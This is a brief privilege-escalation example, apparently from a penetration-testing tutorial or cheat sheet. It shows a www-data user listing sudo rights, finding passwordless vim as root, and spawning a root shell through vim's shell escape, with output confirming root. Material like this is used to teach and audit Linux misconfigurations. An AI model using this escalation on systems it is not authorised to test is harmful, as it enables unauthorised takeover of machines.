# Example 1: Linux Sudo to Root

```bash
# Check sudo permissions
$ sudo -l
User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/vim

# Exploit vim
$ sudo vim -c ':!/bin/bash'
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)
```